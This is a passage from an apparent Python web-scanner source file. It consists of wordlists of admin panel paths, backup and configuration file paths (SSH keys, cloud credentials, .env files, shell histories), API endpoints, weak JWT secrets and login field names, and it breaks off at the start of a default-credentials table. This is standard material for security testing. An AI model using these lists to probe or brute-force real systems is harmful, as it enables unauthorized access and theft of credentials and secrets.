    "/sqlalchemy-admin", "/sqlalchemy-admin/",
    "/peewee-admin", "/peewee-admin/",
    "/tortoise-admin", "/tortoise-admin/",
    "/sequelize-admin", "/sequelize-admin/",
    "/typeorm-admin", "/typeorm-admin/",
    "/prisma-admin", "/prisma-admin/",
    "/gorm-admin", "/gorm-admin/",
    "/objection-admin", "/objection-admin/",
    "/knex-admin", "/knex-admin/",
    "/mongoose-admin", "/mongoose-admin/",
    "/mongoose", "/mongoose/admin",
    "/mongodb-ui", "/mongodb-ui/",
    "/mongoexpress", "/mongo-express", "/mongo-express/",
    "/redis-commander", "/redis-commander/",
    "/redisinsight", "/redisinsight/",
    "/cassandra-web", "/cassandra-web/",
    "/neo4j-browser", "/neo4j-browser/",
    "/influxdb-ui", "/influxdb-ui/",
    "/chronograf", "/chronograf/admin",
    "/superset", "/superset/admin",
    "/metabase", "/metabase/admin",
    "/redash", "/redash/admin",
    "/looker", "/looker/admin",
    "/tableau", "/tableau/admin",
    "/powerbi-admin", "/powerbi-admin/",
    "/quicksight-admin", "/quicksight-admin/",
    "/domo-admin", "/domo-admin/",
    "/periscope-admin", "/periscope-admin/",
    "/mode-admin", "/mode-admin/",
    "/amplitude-admin", "/amplitude-admin/",
    "/mixpanel-admin", "/mixpanel-admin/",
    "/segment-admin", "/segment-admin/",
    "/ga-admin", "/ga-admin/",
    "/gtm-admin", "/gtm-admin/",
    "/heap-admin", "/heap-admin/",
    "/fullstory-admin", "/fullstory-admin/",
    "/hotjar-admin", "/hotjar-admin/",
    "/mouseflow-admin", "/mouseflow-admin/",
    "/crazyegg-admin", "/crazyegg-admin/",
    "/optimizely-admin", "/optimizely-admin/",
    "/vwo-admin", "/vwo-admin/",
    "/unbounce-admin", "/unbounce-admin/",
    "/instapage-admin", "/instapage-admin/",
    "/leadpages-admin", "/leadpages-admin/",
    "/clickfunnels-admin", "/clickfunnels-admin/",
    "/hubspot-admin", "/hubspot-admin/",
    "/salesforce-admin", "/salesforce-admin/",
    "/zoho-admin", "/zoho-admin/",
    "/pipedrive-admin", "/pipedrive-admin/",
    "/intercom-admin", "/intercom-admin/",
    "/zendesk-admin", "/zendesk-admin/",
    "/freshdesk-admin", "/freshdesk-admin/",
    "/kayako-admin", "/kayako-admin/",
    "/zohodesk-admin", "/zohodesk-admin/",
    "/helpscout-admin", "/helpscout-admin/",
    "/drift-admin", "/drift-admin/",
    "/olark-admin", "/olark-admin/",
    "/livechat-admin", "/livechat-admin/",
    "/tawk-admin", "/tawk-admin/",
    "/crisp-admin", "/crisp-admin/",
    "/chatwoot-admin", "/chatwoot-admin/",
    "/rocket-chat-admin", "/rocket-chat-admin/",
    "/mattermost-admin", "/mattermost-admin/",
    "/slack-admin", "/slack-admin/",
    "/teams-admin", "/teams-admin/",
    "/discord-admin", "/discord-admin/",
    "/telegram-admin", "/telegram-admin/",
    "/whatsapp-admin", "/whatsapp-admin/",
    "/twilio-admin", "/twilio-admin/",
    "/sendgrid-admin", "/sendgrid-admin/",
    "/mailchimp-admin", "/mailchimp-admin/",
    "/mailgun-admin", "/mailgun-admin/",
    "/postmark-admin", "/postmark-admin/",
    "/ses-admin", "/ses-admin/",
    "/mandrill-admin", "/mandrill-admin/",
    "/sparkpost-admin", "/sparkpost-admin/",
    "/sendinblue-admin", "/sendinblue-admin/",
    "/klaviyo-admin", "/klaviyo-admin/",
    "/drip-admin", "/drip-admin/",
    "/convertkit-admin", "/convertkit-admin/",
    "/activecampaign-admin", "/activecampaign-admin/",
    "/aweber-admin", "/aweber-admin/",
    "/getresponse-admin", "/getresponse-admin/",
    "/constantcontact-admin", "/constantcontact-admin/",
    "/icontact-admin", "/icontact-admin/",
    "/benchmark-admin", "/benchmark-admin/",
    "/maropost-admin", "/maropost-admin/",
    "/sendy-admin", "/sendy-admin/",
    "/mautic", "/mautic/admin",
    "/eloqua-admin", "/eloqua-admin/",
    "/marketo-admin", "/marketo-admin/",
    "/pardot-admin", "/pardot-admin/",
    "/act-admin", "/act-admin/",
    "/infusionsoft-admin", "/infusionsoft-admin/",
    "/stripe-admin", "/stripe-admin/",
    "/braintree-admin", "/braintree-admin/",
    "/paypal-admin", "/paypal-admin/",
    "/square-admin", "/square-admin/",
    "/adyen-admin", "/adyen-admin/",
    "/worldpay-admin", "/worldpay-admin/",
    "/authorize-admin", "/authorize-admin/",
    "/2checkout-admin", "/2checkout-admin/",
    "/nmi-admin", "/nmi-admin/",
    "/recurly-admin", "/recurly-admin/",
    "/chargebee-admin", "/chargebee-admin/",
    "/zuora-admin", "/zuora-admin/",
    "/chargify-admin", "/chargify-admin/",
    "/paddle-admin", "/paddle-admin/",
    "/fastspring-admin", "/fastspring-admin/",
    "/gumroad-admin", "/gumroad-admin/",
    "/clickbank-admin", "/clickbank-admin/",
    "/jvzoo-admin", "/jvzoo-admin/",
    "/digistore-admin", "/digistore-admin/",
    "/ejunkie-admin", "/ejunkie-admin/",
    "/thrivecart-admin", "/thrivecart-admin/",
    "/samcart-admin", "/samcart-admin/",
    "/kartra-admin", "/kartra-admin/",
    "/teachable-admin", "/teachable-admin/",
    "/thinkific-admin", "/thinkific-admin/",
    "/podia-admin", "/podia-admin/",
    "/kajabi-admin", "/kajabi-admin/",
    "/memberpress-admin", "/memberpress-admin/",
    "/accessally-admin", "/accessally-admin/",
    "/wpfusion-admin", "/wpfusion-admin/",
    "/wishlist-admin", "/wishlist-admin/",
    "/restrict-admin", "/restrict-admin/",
    "/pmpro-admin", "/pmpro-admin/",
    "/s2member-admin", "/s2member-admin/",
    "/learnpress-admin", "/learnpress-admin/",
    "/learndash-admin", "/learndash-admin/",
    "/lifterLMS-admin", "/lifterlms-admin/",
    "/tutor-admin", "/tutor-admin/",
    "/masteriyo-admin", "/masteriyo-admin/",
    "/sensei-admin", "/sensei-admin/",
    "/bbpress-admin", "/bbpress-admin/",
    "/buddypress-admin", "/buddypress-admin/",
    "/buddyboss-admin", "/buddyboss-admin/",
    "/peepso-admin", "/peepso-admin/",
    "/wblwp-admin", "/wblwp-admin/",
    "/userpro-admin", "/userpro-admin/",
    "/profilepress-admin", "/profilepress-admin/",
    "/userswp-admin", "/userswp-admin/",
    "/wpum-admin", "/wpum-admin/",
    "/um-admin", "/um-admin/",
    "/ultimatemember-admin", "/ultimatemember-admin/",
    "/armember-admin", "/armember-admin/",
    "/paymembership-admin", "/paymembership-admin/",
    "/rcp-admin", "/rcp-admin/",
    "/mepr-admin", "/mepr-admin/",
    "/mycred-admin", "/mycred-admin/",
    "/gamipress-admin", "/gamipress-admin/",
    "/badgeos-admin", "/badgeos-admin/",
    "/achievemints-admin", "/achievemints-admin/",
    "/cubepoints-admin", "/cubepoints-admin/",
    "/wck-admin", "/wck-admin/",
    "/acf-admin", "/acf-admin/",
    "/mb-admin", "/mb-admin/",
    "/rwmb-admin", "/rwmb-admin/",
    "/pods-admin", "/pods-admin/",
    "/toolset-admin", "/toolset-admin/",
    "/types-admin", "/types-admin/",
    "/cptui-admin", "/cptui-admin/",
    "/pp-admin", "/pp-admin/",
    "/fm-admin", "/fm-admin/",
    "/nf-admin", "/nf-admin/",
    "/cf7-admin", "/cf7-admin/",
    "/gf-admin", "/gf-admin/",
    "/wpcf7-admin", "/wpcf7-admin/",
    "/mc4wp-admin", "/mc4wp-admin/",
    "/optinmonster-admin", "/optinmonster-admin/",
    "/sumo-admin", "/sumo-admin/",
    "/hello-bar-admin", "/hello-bar-admin/",
    "/leadpages-wp-admin", "/leadpages-wp-admin/",
    "/thrive-admin", "/thrive-admin/",
    "/blogsync-admin", "/blogsync-admin/",
    "/blogvault-admin", "/blogvault-admin/",
    "/managewp-admin", "/managewp-admin/",
    "/mainwp-admin", "/mainwp-admin/",
    "/wpremote-admin", "/wpremote-admin/",
    "/rocketgenius-admin", "/rocketgenius-admin/",
    "/siteground-admin", "/siteground-admin/",
    "/godaddy-admin", "/godaddy-admin/",
    "/hostgator-admin", "/hostgator-admin/",
    "/bluehost-admin", "/bluehost-admin/",
    "/namecheap-admin", "/namecheap-admin/",
    "/domain-admin", "/domain-admin/",
    "/registrar-admin", "/registrar-admin/",
    "/nameserver-admin", "/nameserver-admin/",
    "/dns-admin", "/dns-admin/",
    "/zone-admin", "/zone-admin/",
    "/record-admin", "/record-admin/",
    "/cert-admin", "/cert-admin/",
    "/ssl-admin", "/ssl-admin/",
    "/tls-admin", "/tls-admin/",
    "/ca-admin", "/ca-admin/",
    "/pki-admin", "/pki-admin/",
    "/crl-admin", "/crl-admin/",
    "/ocsp-admin", "/ocsp-admin/",
    "/acme-admin", "/acme-admin/",
    "/letsencrypt-admin", "/letsencrypt-admin/",
    "/certbot-admin", "/certbot-admin/",
    "/comodo-admin", "/comodo-admin/",
    "/digicert-admin", "/digicert-admin/",
    "/geotrust-admin", "/geotrust-admin/",
    "/verisign-admin", "/verisign-admin/",
    "/symantec-admin", "/symantec-admin/",
    "/globalsign-admin", "/globalsign-admin/",
    "/entrust-admin", "/entrust-admin/",
    "/godaddy-ssl", "/godaddy-ssl/admin",
    "/sectigo-admin", "/sectigo-admin/",
    "/thawte-admin", "/thawte-admin/",
    "/rapidssl-admin", "/rapidssl-admin/",
    "/trustwave-admin", "/trustwave-admin/",
    "/fortify-admin", "/fortify-admin/",
    "/qualys-admin", "/qualys-admin/",
    "/tenable-admin", "/tenable-admin/",
    "/rapid7-admin", "/rapid7-admin/",
    "/metasploit-admin", "/metasploit-admin/",
    "/cobalt-admin", "/cobalt-admin/",
    "/burp-admin", "/burp-admin/",
    "/zaproxy-admin", "/zaproxy-admin/",
    "/nessus-admin", "/nessus-admin/",
    "/openvas-admin", "/openvas-admin/",
    "/greenbone-admin", "/greenbone-admin/",
    "/nikto-admin", "/nikto-admin/",
    "/acunetix-admin", "/acunetix-admin/",
    "/nuclei-admin", "/nuclei-admin/",
    "/amass-admin", "/amass-admin/",
    "/subfinder-admin", "/subfinder-admin/",
    "/ffuf-admin", "/ffuf-admin/",
    "/gobuster-admin", "/gobuster-admin/",
    "/dirb-admin", "/dirb-admin/",
    "/dirbuster-admin", "/dirbuster-admin/",
    "/wfuzz-admin", "/wfuzz-admin/",
    "/feroxbuster-admin", "/feroxbuster-admin/",
    "/httpx-admin", "/httpx-admin/",
    "/nmap-admin", "/nmap-admin/",
    "/masscan-admin", "/masscan-admin/",
    "/shodan-admin", "/shodan-admin/",
    "/censys-admin", "/censys-admin/",
    "/binaryedge-admin", "/binaryedge-admin/",
    "/spyse-admin", "/spyse-admin/",
    "/fofa-admin", "/fofa-admin/",
    "/zoomeye-admin", "/zoomeye-admin/",
    "/hunter-admin", "/hunter-admin/",
    "/intelx-admin", "/intelx-admin/",
]))

EXTENDED_BACKUP_PATHS_2 = [
    "/backup_db.sql", "/backup_data.sql", "/backup_2024.sql",
    "/backup_2023.sql", "/backup_2022.sql", "/backup_old.sql",
    "/database_2024.sql", "/database_2023.sql", "/database_dump.sql",
    "/db_2024.sql", "/db_2023.sql", "/db_dump.sql", "/db_export.sql",
    "/site_backup.zip", "/site_backup.tar.gz", "/site_backup.tar",
    "/site_backup_2024.zip", "/site_backup_2023.zip",
    "/full_backup.zip", "/full_backup.tar.gz",
    "/complete_backup.zip", "/complete_backup.tar.gz",
    "/files_backup.zip", "/media_backup.zip",
    "/uploads_backup.zip", "/content_backup.zip",
    "/wp_backup.zip", "/wordpress_backup.zip",
    "/joomla_backup.zip", "/drupal_backup.zip",
    "/magento_backup.zip", "/opencart_backup.zip",
    "/prestashop_backup.zip", "/oscommerce_backup.zip",
    "/htdocs.tar.gz", "/public_html.tar.gz",
    "/www.tar.gz", "/www.zip", "/web.tar.gz",
    "/html.tar.gz", "/html.zip", "/root.tar.gz",
    "/home.tar.gz", "/var.tar.gz",
    "/backup.bak", "/database.bak", "/site.bak",
    "/config.bak", "/wp-config.bak", "/settings.bak",
    "/index.php.bak", "/index.html.bak", "/index.bak",
    "/login.php.bak", "/admin.php.bak",
    "/config.php.save", "/wp-config.php.save",
    "/config.php.orig", "/config.php.swp",
    "/wp-config.php.orig", "/wp-config.php.swp",
    "/.wp-config.php.swp", "/.config.php.swp",
    "/.index.php.swp", "/.login.php.swp",
    "/config.yaml", "/config.yml", "/config.json",
    "/config.toml", "/config.ini", "/config.conf",
    "/config.xml", "/config.env", "/config.properties",
    "/app.yaml", "/app.yml", "/app.json",
    "/app.toml", "/app.conf", "/app.ini",
    "/application.yaml", "/application.json",
    "/application.conf", "/application.ini",
    "/settings.yaml", "/settings.yml", "/settings.json",
    "/settings.toml", "/settings.conf", "/settings.ini",
    "/settings.xml", "/settings.env",
    "/local.yaml", "/local.yml", "/local.json",
    "/local_settings.yaml", "/local_settings.json",
    "/dev.yaml", "/dev.yml", "/dev.json", "/dev.env",
    "/development.yaml", "/development.json",
    "/staging.yaml", "/staging.json", "/staging.env",
    "/production.yaml", "/production.json", "/production.env",
    "/prod.yaml", "/prod.json", "/prod.env",
    "/test.yaml", "/test.json", "/test.env",
    "/testing.yaml", "/testing.json",
    "/.env.test", "/.env.testing", "/.env.development",
    "/.env.stage", "/.env.prod", "/.env.production.local",
    "/.env.development.local", "/.env.staging.local",
    "/.env2", "/.env3", "/.env_backup", "/.env_old",
    "/.env.orig", "/.env.bkp", "/.env.copy", "/.env.new",
    "/secrets.yaml", "/secrets.yml", "/secrets.json",
    "/secrets.toml", "/secrets.env",
    "/credentials.yaml", "/credentials.json",
    "/credentials.env", "/credentials.csv",
    "/keys.yaml", "/keys.json", "/keys.env",
    "/tokens.yaml", "/tokens.json", "/tokens.env",
    "/passwords.txt", "/passwords.csv",
    "/users.txt", "/users.csv", "/users.json",
    "/accounts.txt", "/accounts.csv",
    "/dump.json", "/export.json", "/data.json",
    "/backup.json", "/snapshot.json",
    "/data.csv", "/export.csv", "/users.sql",
    "/admin.sql", "/accounts.sql",
    "/server.xml", "/web.xml", "/beans.xml",
    "/struts.xml", "/hibernate.cfg.xml",
    "/applicationContext.xml", "/spring-context.xml",
    "/datasource.xml", "/security-config.xml",
    "/log4j.xml", "/log4j.properties",
    "/log4j2.xml", "/log4j2.properties",
    "/logback.xml", "/logback.properties",
    "/nginx.conf", "/nginx.conf.bak", "/nginx.conf.orig",
    "/nginx-site.conf", "/site.conf", "/vhost.conf",
    "/000-default.conf", "/default.conf",
    "/apache.conf", "/apache2.conf", "/httpd.conf",
    "/httpd.conf.bak", "/apache.conf.bak",
    "/php.ini", "/php.ini.bak", "/php-cli.ini",
    "/my.cnf", "/my.ini", "/mysql.conf",
    "/redis.conf", "/redis.conf.bak",
    "/mongod.conf", "/mongodb.conf",
    "/postgresql.conf", "/pg_hba.conf",
    "/elasticsearch.yml", "/kibana.yml",
    "/grafana.ini", "/prometheus.yml",
    "/.bash_history", "/.bash_profile", "/.bashrc",
    "/.bash_logout", "/.profile", "/.zshrc",
    "/.zsh_history", "/.sh_history",
    "/root/.bash_history", "/home/www-data/.bash_history",
    "/home/ubuntu/.bash_history", "/home/ec2-user/.bash_history",
    "/var/log/access.log", "/var/log/error.log",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/mysql/error.log", "/var/log/php_errors.log",
    "/var/log/syslog", "/var/log/auth.log",
    "/var/log/secure", "/var/log/messages",
    "/tmp/sess_", "/tmp/php", "/tmp/phpinfo",
    "/storage/logs/laravel.log", "/app/storage/logs/laravel.log",
    "/framework/logs/laravel.log",
    "/writable/logs/log-", "/application/logs/",
    "/runtime/logs/", "/var/logs/", "/logs/error.log",
    "/logs/access.log", "/logs/debug.log", "/logs/app.log",
    "/error.log", "/debug.log", "/app.log", "/server.log",
    "/application.log", "/system.log", "/audit.log",
    "/security.log", "/access_log", "/error_log",
    "/.DS_Store", "/.DS_Store.bak",
    "/Thumbs.db", "/desktop.ini", "/ehthumbs.db",
    "/NTUSER.DAT", "/ntuser.dat",
    "/.ssh/id_rsa", "/.ssh/id_rsa.pub",
    "/.ssh/id_ed25519", "/.ssh/id_ed25519.pub",
    "/.ssh/id_ecdsa", "/.ssh/id_ecdsa.pub",
    "/.ssh/authorized_keys", "/.ssh/known_hosts",
    "/.ssh/config", "/.ssh/id_dsa",
    "/.gnupg/secring.gpg", "/.gnupg/pubring.gpg",
    "/.gnupg/trustdb.gpg", "/.gnupg/pubring.kbx",
    "/.aws/credentials", "/.aws/config",
    "/.azure/credentials", "/.azure/config",
    "/.gcloud/credentials.json", "/.kube/config",
    "/.docker/config.json", "/.npmrc", "/.yarnrc",
    "/.pypirc", "/.pip/pip.conf",
    "/.composer/auth.json", "/.gem/credentials",
    "/.m2/settings.xml", "/.gradle/gradle.properties",
    "/.gitconfig", "/.hgrc", "/.svn/auth/",
    "/sftp-config.json", "/ftp-deploy.json",
    "/deploy.rb", "/mina/deploy.rb",
    "/capfile", "/Capfile", "/capistrano",
    "/deploy.yml", "/deployment.yml",
    "/ansible.cfg", "/ansible/hosts",
    "/inventory", "/inventory.yml", "/hosts.yml",
    "/terraform.tfvars", "/terraform.tfstate",
    "/terraform.tfstate.backup",
    "/.terraform/terraform.tfstate",
    "/Pulumi.yaml", "/Pulumi.dev.yaml",
    "/serverless.yml", "/serverless.json",
    "/sam-template.yaml", "/template.yaml",
    "/cloudformation.yaml", "/cloudformation.json",
    "/docker-compose.prod.yml", "/docker-compose.staging.yml",
    "/docker-compose.override.yml",
    "/.dockerignore", "/docker-compose.local.yml",
    "/Vagrantfile", "/vagrant.json",
    "/jest.config.js", "/jest.config.ts",
    "/webpack.config.js", "/webpack.config.ts",
    "/vite.config.js", "/vite.config.ts",
    "/rollup.config.js", "/tsconfig.json",
    "/tsconfig.prod.json", "/tsconfig.build.json",
    "/jsconfig.json", "/babel.config.js",
    "/.babelrc", "/.eslintrc", "/.eslintrc.json",
    "/.eslintrc.js", "/.prettierrc", "/.prettierrc.json",
    "/.stylelintrc", "/.mocharc.yml",
    "/karma.conf.js", "/protractor.conf.js",
    "/cypress.json", "/cypress.config.js",
    "/playwright.config.js", "/playwright.config.ts",
    "/.env.ci", "/.env.e2e", "/.env.integration",
    "/.env.uat", "/.env.qa", "/.env.performance",
    "/.env.load", "/.env.stress",
    "/.travis.yml", "/.circleci/config.yml",
    "/.github/workflows/main.yml",
    "/.github/workflows/deploy.yml",
    "/.gitlab-ci.yml", "/bitbucket-pipelines.yml",
    "/Jenkinsfile", "/azure-pipelines.yml",
    "/cloudbuild.yaml", "/appspec.yml",
    "/buildspec.yml", "/buildspec.json",
    "/.drone.yml", "/codefresh.yml",
    "/buddy.yml", "/woodpecker.yml",
    "/sonar-project.properties",
    "/.sonarcloud.properties",
    "/snyk.json", "/.snyk",
    "/dependabot.yml", "/.dependabot/config.yml",
    "/SECURITY.md", "/security.txt",
    "/.well-known/security.txt",
    "/BUG_BOUNTY.md", "/DISCLOSURE.md",
    "/VULNERABILITY.md", "/CVE.md",
]

MORE_API_PATHS = [
    "/api/v4", "/api/v5", "/api/v6", "/api/v7", "/api/v8",
    "/api/v10", "/api/v11", "/api/v12",
    "/api/v1/health", "/api/v2/health", "/api/v3/health",
    "/api/v1/status", "/api/v2/status",
    "/api/v1/version", "/api/v2/version",
    "/api/v1/ping", "/api/v2/ping",
    "/api/v1/me", "/api/v2/me",
    "/api/v1/whoami", "/api/v2/whoami",
    "/api/v1/user", "/api/v2/user",
    "/api/v1/users", "/api/v2/users", "/api/v3/users",
    "/api/v1/user/me", "/api/v2/user/me",
    "/api/v1/users/me", "/api/v2/users/me",
    "/api/v1/account", "/api/v2/account",
    "/api/v1/accounts", "/api/v2/accounts",
    "/api/v1/profile", "/api/v2/profile",
    "/api/v1/profiles", "/api/v2/profiles",
    "/api/v1/session", "/api/v2/session",
    "/api/v1/sessions", "/api/v2/sessions",
    "/api/v1/auth/me", "/api/v2/auth/me",
    "/api/v1/auth/user", "/api/v2/auth/user",
    "/api/v1/auth/check", "/api/v2/auth/check",
    "/api/v1/auth/verify", "/api/v2/auth/verify",
    "/api/v1/auth/whoami",
    "/api/v1/admin/users", "/api/v2/admin/users",
    "/api/v1/admin/config", "/api/v2/admin/config",
    "/api/v1/admin/settings", "/api/v2/admin/settings",
    "/api/v1/admin/health", "/api/v2/admin/health",
    "/api/v1/admin/debug", "/api/v2/admin/debug",
    "/api/v1/admin/stats", "/api/v2/admin/stats",
    "/api/v1/admin/logs", "/api/v2/admin/logs",
    "/api/v1/admin/audit", "/api/v2/admin/audit",
    "/api/v1/admin/export",
    "/api/v1/admin/import",
    "/api/v1/admin/backup",
    "/api/v1/debug/env",
    "/api/v1/debug/config",
    "/api/v1/debug/info",
    "/api/v1/debug/routes",
    "/api/v1/debug/vars",
    "/api/v1/debug/heap",
    "/api/v1/debug/stack",
    "/api/v1/debug/pprof",
    "/api/v1/internal/users",
    "/api/v1/internal/config",
    "/api/v1/internal/admin",
    "/api/v1/internal/health",
    "/api/v1/internal/debug",
    "/api/v1/internal/metrics",
    "/api/v1/private/users",
    "/api/v1/private/admin",
    "/api/v1/private/config",
    "/api/v1/system/info",
    "/api/v1/system/config",
    "/api/v1/system/health",
    "/api/v1/system/status",
    "/api/v1/system/admin",
    "/api/v1/system/users",
    "/api/v1/config/all",
    "/api/v1/config/database",
    "/api/v1/config/email",
    "/api/v1/config/payment",
    "/api/v1/config/storage",
    "/api/v1/config/cache",
    "/api/v1/config/security",
    "/api/v1/export/users",
    "/api/v1/export/all",
    "/api/v1/export/database",
    "/api/v1/backup/create",
    "/api/v1/backup/download",
    "/api/v1/backup/list",
    "/api/v1/keys", "/api/v1/apikeys", "/api/v1/tokens",
    "/api/v1/secrets", "/api/v1/credentials",
    "/api/v1/oauth/token", "/api/v1/oauth/authorize",
    "/api/v1/oauth/clients", "/api/v1/oauth/keys",
    "/api/v1/jwt/generate", "/api/v1/jwt/verify",
    "/api/v1/password/reset", "/api/v1/password/change",
    "/api/v1/2fa/setup", "/api/v1/2fa/verify",
    "/api/v1/2fa/disable",
    "/api/v1/webhook/events",
    "/api/v1/webhook/secret",
    "/api/v1/webhook/register",
    "/api/v1/payments", "/api/v1/transactions",
    "/api/v1/billing", "/api/v1/invoices",
    "/api/v1/subscriptions", "/api/v1/plans",
    "/api/v1/coupons", "/api/v1/discounts",
    "/api/v1/products", "/api/v1/catalog",
    "/api/v1/orders", "/api/v1/cart",
    "/api/v1/customers", "/api/v1/clients",
    "/api/v1/employees", "/api/v1/staff",
    "/api/v1/analytics", "/api/v1/metrics",
    "/api/v1/statistics", "/api/v1/reports",
    "/api/v1/notifications", "/api/v1/emails",
    "/api/v1/messages", "/api/v1/chat",
    "/api/v1/files", "/api/v1/uploads",
    "/api/v1/media", "/api/v1/images",
    "/api/v1/documents", "/api/v1/attachments",
    "/api/v1/search", "/api/v1/autocomplete",
    "/api/v1/suggest",
    "/api/v1/geo", "/api/v1/location", "/api/v1/ip",
    "/api/v1/lookup", "/api/v1/resolve",
    "/api/v1/social/google", "/api/v1/social/github",
    "/api/v1/social/facebook", "/api/v1/social/twitter",
    "/api/v1/social/linkedin",
    "/api/v1/integrations", "/api/v1/plugins",
    "/api/v1/apps", "/api/v1/extensions",
    "/api/v1/webhooks", "/api/v1/callbacks",
    "/api/v1/events", "/api/v1/logs",
    "/api/v1/audit", "/api/v1/activity",
    "/api/v1/roles", "/api/v1/permissions",
    "/api/v1/policies", "/api/v1/rules",
    "/api/v1/acl", "/api/v1/access",
    "/api/v1/groups", "/api/v1/teams",
    "/api/v1/organizations", "/api/v1/tenants",
    "/api/v1/workspaces", "/api/v1/projects",
    "/api/v1/environments", "/api/v1/features",
    "/api/v1/flags", "/api/v1/toggles",
    "/api/v1/experiments",
    "/api/v1/cron", "/api/v1/tasks",
    "/api/v1/jobs", "/api/v1/queue",
    "/api/v1/workers", "/api/v1/scheduler",
    "/api/v1/cache/clear", "/api/v1/cache/flush",
    "/api/v1/cache/stats",
    "/api/v1/health/live", "/api/v1/health/ready",
    "/api/v1/health/started",
    "/api/v1/readyz", "/api/v1/livez",
    "/api/v1/startupz",
    "/api/internal", "/api/private", "/api/secret",
    "/api/hidden", "/api/debug",
    "/api/dev", "/api/test", "/api/testing",
    "/api/staging", "/api/preview",
    "/api/beta", "/api/alpha", "/api/experimental",
    "/api/legacy", "/api/old", "/api/deprecated",
    "/api/raw", "/api/bulk", "/api/batch",
    "/api/json", "/api/xml", "/api/csv",
    "/api/rpc", "/api/grpc", "/api/soap",
    "/api/ws", "/api/wss", "/api/socket",
    "/api/stream", "/api/events",
    "/api/sse", "/api/push", "/api/poll",
    "/_api", "/_rest", "/_graphql",
    "/__api", "/__rest", "/__graphql",
    "/api~", "/api-dev", "/api-test", "/api-staging",
    "/api-v1", "/api-v2", "/api-v3",
    "/rest-api", "/restapi", "/rest_api",
    "/json-api", "/jsonapi", "/json_api",
    "/external-api", "/internal-api", "/partner-api",
    "/public-api", "/private-api",
    "/open-api", "/openapi-json",
    "/swagger-json", "/swagger-yaml",
    "/redoc", "/rapidoc", "/elements",
    "/api-explorer", "/api-playground",
    "/apidoc", "/apidocs", "/api-documentation",
]

JWT_WEAK_SECRETS_LIST = [
    "secret", "password", "123456", "password123", "admin", "test",
    "default", "changeme", "supersecret", "mysecret", "topsecret",
    "secretkey", "secret_key", "secretpassword", "secretpass",
    "jwt_secret", "jwt-secret", "jwt_key", "jwtkey", "jwt-key",
    "app_secret", "app-secret", "appsecret", "application_secret",
    "auth_secret", "auth-secret", "authsecret", "auth_key",
    "api_secret", "api-secret", "apisecret", "api_key",
    "token_secret", "token-secret", "tokensecret", "token_key",
    "session_secret", "session-secret", "sessionsecret",
    "cookie_secret", "cookie-secret", "cookiesecret",
    "encryption_key", "encryption-key", "encryptionkey",
    "signing_key", "signing-key", "signingkey",
    "private_key", "private-key", "privatekey",
    "master_key", "master-key", "masterkey",
    "access_secret", "access-secret", "accesssecret",
    "oauth_secret", "oauth-secret", "oauthsecret",
    "openid_secret", "sso_secret", "saml_secret",
    "csrf_secret", "csrf-secret", "csrfkey",
    "xsrf_secret", "xsrf-secret",
    "hmac_secret", "hmac-secret", "hmacsecret",
    "sha_secret", "sha-secret",
    "node_env", "development", "production", "staging",
    "express", "nextjs", "nuxt", "vue", "react",
    "django", "flask", "fastapi", "rails", "laravel",
    "spring", "springboot", "nest", "nestjs",
    "hello", "world", "hello_world", "helloworld",
    "foo", "bar", "baz", "foobar", "foo_bar",
    "qwerty", "qwerty123", "asdf", "asdfgh",
    "1234", "12345", "123456789", "1234567890",
    "abcdef", "abcdefg", "abcdefgh",
    "abc123", "admin123", "root", "root123",
    "pass", "pass123", "passw0rd", "P@ssw0rd",
    "letmein", "welcome", "monkey", "dragon",
    "master", "hunter", "sunshine", "princess",
    "shadow", "superman", "batman", "trustno1",
    "iloveyou", "starwars", "000000", "111111",
    "login", "admin@123", "Admin@123", "Pa$$word",
    "test123", "testing", "testtest", "demo",
    "demo123", "sample", "example", "temp",
    "temp123", "guest", "guest123", "user",
    "user123", "operator", "manage", "manager",
    "myapp", "myapp_secret", "my_app_secret",
    "mysecretapp", "my_secret_app",
    "webapp", "webappkey", "web_app_key",
    "company", "company123", "company_secret",
    "prod_secret", "dev_secret", "stg_secret",
    "local_secret", "staging_secret",
    "production_secret", "development_secret",
    "replace_me", "replace-me", "replaceme",
    "please_replace", "please-change", "change_me",
    "todo", "fixme", "hackme",
    "unsafe", "insecure", "notsecure",
    "weak", "weakpassword", "weakkey",
    "blank", "empty", "null", "none", "undefined",
    "true", "false", "yes", "no",
    "a", "ab", "abc", "abcd",
    "key", "keys", "private", "public",
    "hs256", "hs384", "hs512", "rs256",
    "secret_1", "secret_2", "secret_3",
    "key_1", "key_2", "key_3",
    "token_1", "token_2",
    "jwt_1", "jwt_2",
    "app1", "app2", "api1", "api2",
    "service", "service123", "microservice",
    "backend", "frontend", "fullstack",
    "kubernetes", "docker", "container",
    "aws", "azure", "gcp", "cloud",
    "terraform", "ansible", "puppet",
    "github", "gitlab", "bitbucket",
    "jenkins", "circleci", "travis",
    "wordpress", "drupal", "joomla",
    "magento", "shopify", "woocommerce",
    "mysql", "postgres", "mongodb",
    "redis", "memcache", "elasticsearch",
    "nginx", "apache", "iis",
    "php", "python", "ruby", "java",
    "nodejs", "go", "rust", "scala",
    "4f5fa0b4cfd8487ca2d27a6f51d9e7b8",
    "a3f5b87c9d2e4f1g0h6i7j8k9l0m1n2",
    "supersecretjwtkey2024",
    "supersecretjwttoken",
    "jwt_super_secret_key_2024",
    "very_secret_key_please_change",
    "my_very_secret_jwt_key_12345",
    "this_is_a_very_long_secret_key_that_should_be_changed",
]

LOGIN_FORM_FIELDS = {
    "username_fields": [
        "username", "user", "login", "email", "uname",
        "user_name", "user_login", "userid", "user_id",
        "account", "login_id", "loginid", "login_name",
        "UserName", "Username", "Email", "EMAIL",
        "login_email", "admin", "AdminEmail",
        "phone", "mobile", "contact",
        "identifier", "id", "handle", "name",
        "full_name", "fullname", "display_name",
        "form[username]", "form[email]", "data[username]",
        "user[email]", "session[username]", "auth[username]",
        "credentials[username]", "login[username]",
        "input_username", "input_email", "txt_username",
        "txt_email", "frm_username", "frm_email",
    ],
    "password_fields": [
        "password", "pass", "passwd", "pwd", "passw",
        "user_pass", "userpass", "user_password",
        "Password", "PASS", "PASSWD", "PWD",
        "login_password", "login_pass",
        "admin_password", "admin_pass",
        "secret", "key", "pin", "code",
        "auth_pass", "auth_password",
        "account_pass", "account_password",
        "form[password]", "data[password]",
        "user[password]", "session[password]",
        "credentials[password]", "login[password]",
        "input_password", "txt_password", "txt_pass",
        "frm_password", "frm_pass",
    ],
}

DEFAULT_CREDS_EXTENDED = {
    "WordPress":       [("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),("administrator","password")],
